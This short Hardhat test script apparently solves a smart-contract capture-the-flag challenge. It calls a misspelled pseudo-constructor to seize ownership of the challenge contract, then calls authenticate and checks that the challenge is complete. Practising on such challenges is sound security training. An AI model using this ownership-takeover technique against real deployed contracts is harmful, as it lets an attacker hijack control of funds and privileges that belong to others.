import { ethers } from "hardhat";
import { Contract } from "ethers";
import { expect } from "chai";
import { getContract } from "../utiils";

let contract: Contract;

before(async () => {
    contract = await getContract("AssumeOwnershipChallenge", "0xDB39EFe75E0AddDB5D04a943d50Ebe02632e2636", ethers.utils.parseEther("0"))
});

it("solves the challenge", async function () {
    let tx = await contract.AssumeOwmershipChallenge();

    let txHash = tx && tx.hash
    expect(txHash).to.not.be.undefined

    tx = await contract.authenticate();

    txHash = tx && tx.hash
    expect(txHash).to.not.be.undefined

    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});